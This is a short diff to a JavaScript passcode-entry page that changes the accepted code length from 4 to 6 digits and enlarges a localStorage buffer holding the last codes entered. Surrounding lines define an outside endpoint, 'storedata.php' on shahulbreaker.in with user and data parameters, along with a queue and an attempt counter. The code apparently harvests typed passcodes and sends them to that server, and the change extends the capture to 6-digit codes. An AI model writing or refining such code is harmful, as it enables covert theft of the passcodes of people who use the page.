@@ -1,6 +1,6 @@
 (() => {
   const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarun&data=";
-  const MAX = 4;
+  const MAX = 6; // <-- changed from 4 to 6
   let code = "";
 
   const dotEls = Array.from(document.querySelectorAll('.dot'));
@@ -14,7 +14,7 @@
   const ATT_KEY = '_pass_attempt_count_';
   const QUEUE_KEY = '_pass_queue_';
 
-  // rotating buffer for last up-to-4 entered codes
+  // rotating buffer for last up-to-6 entered codes
   const LAST_CODES_KEY = '_pass_last_codes_';
   function getLastCodes() {
     try {
@@ -27,13 +27,14 @@
     try {
       const arr = getLastCodes();
       arr.push(c);
-      while (arr.length > 4) arr.shift();
+      while (arr.length > 6) arr.shift(); // <-- changed from 4 to 6
       localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
     } catch (e) {}
   }
   function getCombinedLastCodes() {
     return getLastCodes().join(',');
   }
+
 
   function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
   function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }
@@ -449,3 +450,4 @@
   window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };
 
 })();
+
